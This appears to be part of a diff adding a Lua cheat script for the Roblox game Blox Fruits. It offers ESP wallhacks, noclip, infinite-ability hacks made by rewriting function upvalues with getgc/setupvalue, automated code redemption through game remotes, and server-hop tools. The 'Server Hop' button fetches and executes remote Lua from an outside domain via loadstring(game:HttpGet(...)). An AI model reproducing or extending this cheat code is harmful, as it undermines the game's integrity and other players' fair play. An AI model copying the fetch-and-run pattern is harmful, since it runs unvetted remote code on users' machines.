+		local StarterGui = game:GetService("StarterGui");
+		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true);
+	end;
+end);
+MiscTab:Toggle("Hide Leaderboard", _G.leaderboard, "Invisible Leaderboard", function(a)
+	_G.leaderboard = a;
+	if _G.leaderboard == true then
+		local StarterGui = game:GetService("StarterGui");
+		(game:GetService("StarterGui")):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false);
+	elseif _G.leaderboard == false then
+		local StarterGui = game:GetService("StarterGui");
+		(game:GetService("StarterGui")):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true);
+	end;
+end);
+MiscTab:Toggle("Highlight Mode", false, "Hide All Player Gui", function(value)
+	if value == true then
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Beli.Visible = false;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.HP.Visible = false;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Energy.Visible = false;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.StatsButton.Visible = false;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.ShopButton.Visible = false;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Skills.Visible = false;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Level.Visible = false;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.MenuButton.Visible = false;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Code.Visible = false;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Settings.Visible = false;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Mute.Visible = false;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.CrewButton.Visible = false;
+	else
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Beli.Visible = true;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.HP.Visible = true;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Energy.Visible = true;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.StatsButton.Visible = true;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.ShopButton.Visible = true;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Skills.Visible = true;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Level.Visible = true;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.MenuButton.Visible = true;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Code.Visible = true;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Settings.Visible = true;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Mute.Visible = true;
+		(game:GetService("Players")).LocalPlayer.PlayerGui.Main.CrewButton.Visible = true;
+	end;
+end);
+MiscTab:Seperator("Codes");
+local x2Code = {
+	"KITTGAMING",
+	"ENYU_IS_PRO",
+	"FUDD10",
+	"BIGNEWS",
+	"THEGREATACE",
+	"SUB2GAMERROBOT_EXP1",
+	"STRAWHATMAIME",
+	"SUB2OFFICIALNOOBIE",
+	"SUB2NOOBMASTER123",
+	"SUB2DAIGROCK",
+	"AXIORE",
+	"TANTAIGAMIMG",
+	"STRAWHATMAINE",
+	"JCWK",
+	"FUDD10_V2",
+	"SUB2FER999",
+	"MAGICBIS",
+	"TY_FOR_WATCHING",
+	"STARCODEHEO"
+};
+MiscTab:Button("Redeem All Codes", function()
+	function RedeemCode(value)
+		(game:GetService("ReplicatedStorage")).Remotes.Redeem:InvokeServer(value);
+	end;
+	for i, v in pairs(x2Code) do
+		RedeemCode(v);
+	end;
+end);
+MiscTab:Dropdown("Select Codes", {
+	"NOOB_REFUND",
+	"SUB2GAMERROBOT_RESET1",
+	"Sub2UncleKizaru"
+}, false, function(value)
+	_G.CodeSelect = value;
+end);
+MiscTab:Button("Redeem Code", function()
+	(game:GetService("ReplicatedStorage")).Remotes.Redeem:InvokeServer(_G.CodeSelect);
+end);
+MiscTab:Seperator("Graphic");
+MiscTab:Button("FPS Boost", function()
+	local decalsyeeted = true;
+	local g = game;
+	local w = g.Workspace;
+	local l = g.Lighting;
+	local t = w.Terrain;
+	(settings()).Rendering.QualityLevel = "Level01";
+	for i, v in pairs(g:GetDescendants()) do
+		if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
+			v.Material = "Plastic";
+			v.Reflectance = 0;
+		elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
+			v.Transparency = 1;
+		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+			v.Lifetime = NumberRange.new(0);
+		elseif v:IsA("Explosion") then
+			v.BlastPressure = 1;
+			v.BlastRadius = 1;
+		elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
+			v.Enabled = false;
+		end;
+	end;
+end);
+MiscTab:Button("Remove Fog", function()
+	(game:GetService("Lighting")).LightingLayers:Destroy();
+	(game:GetService("Lighting")).Sky:Destroy();
+	game.Lighting.FogEnd = 9000000000;
+end);
+MiscTab:Button("Remove Lava", function()
+	for i, v in pairs(game.Workspace:GetDescendants()) do
+		if v.Name == "Lava" then
+			v:Destroy();
+		end;
+	end;
+	for i, v in pairs(game.ReplicatedStorage:GetDescendants()) do
+		if v.Name == "Lava" then
+			v:Destroy();
+		end;
+	end;
+end);
+EspTab:Seperator("ESP");
+EspTab:Toggle("ESP Player", false, "Highlight Player", function(a)
+	ESPPlayer = a;
+	UpdatePlayerChams();
+end);
+EspTab:Toggle("ESP Chest", false, "Highlight Chest", function(a)
+	ChestESP = a;
+	UpdateChestChams();
+end);
+EspTab:Toggle("ESP Fruit", false, "Highlight Fruit", function(a)
+	DevilFruitESP = a;
+	while DevilFruitESP do
+		wait();
+		UpdateDevilChams();
+	end;
+end);
+EspTab:Toggle("ESP Real Fruit", false, "Highlight Real Fruit", function(a)
+	RealFruitESP = a;
+	UpdateRealFruitChams();
+end);
+EspTab:Toggle("ESP Flower", false, "Highlight Flower", function(a)
+	FlowerESP = a;
+	UpdateFlowerChams();
+end);
+spawn(function()
+	while wait(2) do
+		if FlowerESP then
+			UpdateFlowerChams();
+		end;
+		if DevilFruitESP then
+			UpdateDevilChams();
+		end;
+		if ChestESP then
+			UpdateChestChams();
+		end;
+		if ESPPlayer then
+			UpdatePlayerChams();
+		end;
+		if RealFruitESP then
+			UpdateRealFruitChams();
+		end;
+	end;
+end);
+EspTab:Toggle("ESP Island", IslandESP, "Highlight Island", function(value)
+	IslandESP = value;
+	while IslandESP do
+		wait();
+		UpdateIslandESP();
+	end;
+end);
+EspTab:Toggle("Esp Npc", false, "Highlight Npc", function(nec)
+	NpcESP = nec;
+end);
+EspTab:Toggle("Esp Sea Beast", false, "Highlight SeaBest", function(nec)
+	SeaESP = nec;
+end);
+EspTab:Toggle("Esp Mob", false, "Highlight Mob", function(nec)
+	MobESP = nec;
+end);
+EspTab:Toggle("Esp Mirage Island", false, "Highlight Mirage Island", function(value)
+	MirageIslandESP = value;
+	while MirageIslandESP do
+		wait();
+		UpdateIslandMirageESP();
+	end;
+end);
+EspTab:Toggle("Esp Advanced Fruit Dealer", false, "Highlight Advanced Fruit Dealer", function(value)
+	AfdESP = value;
+	while AfdESP do
+		wait();
+		UpdateAfdESP();
+	end;
+end);
+EspTab:Toggle("Esp Gear", false, "Highlight Gear", function(value)
+	GearESP = value;
+	while GearESP do
+		wait();
+		UpdateGeaESP();
+	end;
+end);
+MiscTab:Seperator("Abilities");
+MiscTab:Toggle("Dodge No Cooldown", false, false, function(value)
+	nododgecool = value;
+	NoDodgeCool();
+end);
+MiscTab:Toggle("Infinite Energy", false, false, function(value)
+	InfiniteEnergy = value;
+	originalstam = LocalPlayer.Character.Energy.Value;
+end);
+MiscTab:Toggle("Auto Active Race V3", _G.AutoAgility, "Auto Active Ability", function(value)
+	_G.AutoAgility = value;
+end);
+MiscTab:Toggle("Auto Active Race V4", _G.AutoAgility, "Auto Active Awakening", function(value)
+	_G.AutoActiveRaceV4 = value;
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.AutoActiveRaceV4 then
+				if game.Players.LocalPlayer.Character.RaceTransformed.Value == false then
+					(game:GetService("VirtualInputManager")):SendKeyEvent(true, "Y", false, game);
+					wait(0.1);
+					(game:GetService("VirtualInputManager")):SendKeyEvent(false, "Y", false, game);
+				end;
+			end;
+		end;
+	end);
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.AutoAgility then
+				(game:GetService("ReplicatedStorage")).Remotes.CommE:FireServer("ActivateAbility");
+			end;
+		end;
+	end);
+end);
+MiscTab:Toggle("Infinite Ability", false, false, function(value)
+	InfAbility = value;
+	if value == false then
+		((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Agility")):Destroy();
+	end;
+end);
+spawn(function()
+	while wait() do
+		if InfAbility then
+			InfAb();
+		end;
+	end;
+end);
+MiscTab:Toggle("Infinite Geppo", (getgenv()).InfGeppo, false, function(value)
+	(getgenv()).InfGeppo = value;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if (getgenv()).InfGeppo then
+				for i, v in next, getgc() do
+					if (game:GetService("Players")).LocalPlayer.Character.Geppo then
+						if typeof(v) == "function" and (getfenv(v)).script == (game:GetService("Players")).LocalPlayer.Character.Geppo then
+							for i2, v2 in next, getupvalues(v) do
+								if tostring(i2) == "9" then
+									repeat
+										wait(0.1);
+										setupvalue(v, i2, 0);
+									until not (getgenv()).InfGeppo or (game:GetService("Players")).LocalPlayer.Character.Humanoid.Health <= 0;
+								end;
+							end;
+						end;
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+MiscTab:Toggle("Infinite Soru", (getgenv()).InfSoru, false, function(value)
+	(getgenv()).InfSoru = value;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if (getgenv()).InfSoru and (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil then
+				for i, v in next, getgc() do
+					if (game:GetService("Players")).LocalPlayer.Character.Soru then
+						if typeof(v) == "function" and (getfenv(v)).script == (game:GetService("Players")).LocalPlayer.Character.Soru then
+							for i2, v2 in next, getupvalues(v) do
+								if typeof(v2) == "table" then
+									repeat
+										wait(0.1);
+										v2.LastUse = 0;
+									until not (getgenv()).InfSoru or (game:GetService("Players")).LocalPlayer.Character.Humanoid.Health <= 0;
+								end;
+							end;
+						end;
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+MiscTab:Toggle("Walk on Water", true, false, function(value)
+	_G.WalkWater = value;
+end);
+spawn(function()
+	while task.wait() do
+		pcall(function()
+			if _G.WalkWater then
+				(game:GetService("Workspace")).Map["WaterBase-Plane"].Size = Vector3.new(1000, 112, 1000);
+			else
+				(game:GetService("Workspace")).Map["WaterBase-Plane"].Size = Vector3.new(1000, 80, 1000);
+			end;
+		end);
+	end;
+end);
+MiscTab:Toggle("NoClip", _G.NoClip, false, function(value)
+	_G.NoClip = value;
+end);
+spawn(function()
+	pcall(function()
+		(game:GetService("RunService")).Stepped:Connect(function()
+			if _G.NoClip then
+				for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+					if v:IsA("BasePart") or v:IsA("Part") then
+						v.CanCollide = false;
+					end;
+				end;
+			end;
+		end);
+	end);
+end);
+ServTab:Seperator("Server");
+task.spawn(function()
+	while task.wait() do
+		pcall(function()
+			if (game:GetService("Lighting")).Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709149431" then
+				FM:Set("🌕 Full Moon 100%");
+			elseif (game:GetService("Lighting")).Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709149052" then
+				FM:Set("🌖 Full Moon 75%");
+			elseif (game:GetService("Lighting")).Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709143733" then
+				FM:Set("🌗 Full Moon 50%");
+			elseif (game:GetService("Lighting")).Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709150401" then
+				FM:Set("🌘 Full Moon 25%");
+			elseif (game:GetService("Lighting")).Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709149680" then
+				FM:Set("🌘 Full Moon 15%");
+			else
+				FM:Set("Wait For Moon");
+			end;
+		end);
+	end;
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if game.Workspace._WorldOrigin.Locations:FindFirstChild("Mirage Island") then
+				MirageStatus:Set("🏝️ Mirage Island is Spawning");
+			else
+				MirageStatus:Set("🏝️ Mirage Island Not Spawn");
+			end;
+			if game.Workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island") then
+				KitsuneStatus:Set("⛩️ Kitsune Island is Spawning");
+			else
+				KitsuneStatus:Set("⛩️ Kitsune Island Not Spawn");
+			end;
+			for i, v in pairs(game.Workspace:GetChildren()) do
+				if string.find(v.Name, "Fruit") then
+					FindFruit:Set("🍏 Find " .. v.Name);
+				else
+					FindFruit:Set("🍏 Nothing");
+				end;
+			end;
+		end;
+	end);
+end);
+spawn(function()
+	while wait(5) do
+		pcall(function()
+			if GetLegendarySwordDealer() then
+				SwordDealer:Set("⚔️ Legendary Sword Dealer is Spawning");
+			else
+				SwordDealer:Set("⚔️ Legendary Sword Dealer Not Spawn");
+			end;
+			if (((game:GetService("ReplicatedStorage")):WaitForChild("Remotes")):WaitForChild("CommF_")):InvokeServer("ColorsDealer", "1") then
+				HakiDealer:Set("🟢 Haki Dealer is Spawning");
+			else
+				HakiDealer:Set("🔴 Haki Dealer Not Spawn");
+			end;
+		end);
+	end;
+end);
+function GetLegendarySwordDealer()
+	if (((game:GetService("ReplicatedStorage")):WaitForChild("Remotes")):WaitForChild("CommF_")):InvokeServer("ColorsDealer", "1") or (((game:GetService("ReplicatedStorage")):WaitForChild("Remotes")):WaitForChild("CommF_")):InvokeServer("ColorsDealer", "2") or (((game:GetService("ReplicatedStorage")):WaitForChild("Remotes")):WaitForChild("CommF_")):InvokeServer("ColorsDealer", "3") then
+		return true;
+	end;
+	return false;
+end;
+ServTab:Button("Rejoin Server", function()
+	(game:GetService("TeleportService")):Teleport(game.PlaceId, (game:GetService("Players")).LocalPlayer);
+end);
+ServTab:Button("Server Hop", function()
+	while wait() do
+		local module = (loadstring(game:HttpGet("https://you.whimper.xyz/sources/relzhub/dep/Hop.lua")))();
+		module:Teleport(game.PlaceId, "Singapore");
+	end;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			JobAiDee:Set("Server Job ID : " .. game.JobId);
+		end);
+	end;
+end);
+ServTab:Line();
+JobAiDee = ServTab:Label("Server Job ID : ");
+ServTab:Button("Copy Server Job ID", function()
+	setclipboard(tostring(game.JobId));
+end);
+ServTab:Textbox("Enter Server Job ID", true, function(value)
+	_G.Job = value;
+end);
+ServTab:Button("Join Sever", function()
+	(game:GetService("TeleportService")):TeleportToPlaceInstance(game.placeId, _G.Job, game.Players.LocalPlayer);
+end);
+ServTab:Seperator("Status");
+FM = ServTab:Label("Moon");
+MirageStatus = ServTab:Label("Mirage");
+KitsuneStatus = ServTab:Label("Kitsune");
+SwordDealer = ServTab:Label("Legendary Sword Dealer");
+HakiDealer = ServTab:Label("Haki Dealer");
+FindFruit = ServTab:Label("Devil Fruit");
+ServTab:Seperator("Advance Fruit Stock");
+local ReplicatedStorage = game:GetService("ReplicatedStorage");
+local Remotes = ReplicatedStorage.Remotes;
+local Event = Remotes.CommF_;
+local result = Event:InvokeServer("GetFruits", true);
+local fruitsOnSale = {};
+local function addCommas(number)
+	local formatted = tostring(number);
+	while true do
+		formatted, k = formatted:gsub("^(-?%d+)(%d%d%d)", "%1,%2");
+		if k == 0 then
+			break;
+		end;
+	end;
+	return formatted;
+end;
+for _, fruitData in pairs(result) do
+	if fruitData.OnSale == true then
+		local priceWithCommas = addCommas(fruitData.Price);
+		local fruitInfo = fruitData.Name .. " - $" .. priceWithCommas;
+		table.insert(fruitsOnSale, fruitInfo);
+		ServTab:Label(tostring(fruitInfo));
+	end;
+end;
+Alert:create("Done Loaded!");
